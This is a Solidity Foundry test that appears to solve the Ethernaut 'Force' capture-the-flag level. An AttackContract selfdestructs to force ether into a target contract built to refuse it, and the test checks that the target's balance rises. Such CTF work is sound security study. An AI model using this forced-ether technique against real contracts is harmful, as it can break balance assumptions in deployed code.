// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Force} from "../src/07_Force.sol";

contract AttackContract {
    constructor(address payable targetReceiver) payable {
        selfdestruct(targetReceiver);
    }
}

contract TestForce is Test {
    address public player = address(0xbad);
    Force public instance;

    function setUp() public {
        instance = new Force();
        vm.deal(player, 0.001 ether);
    }

    function testSolution() public {
        vm.startPrank(player);

        new AttackContract{value: 1}(payable(address(instance)));

        assertGt(address(instance).balance, 0);
        vm.stopPrank();
    }
}
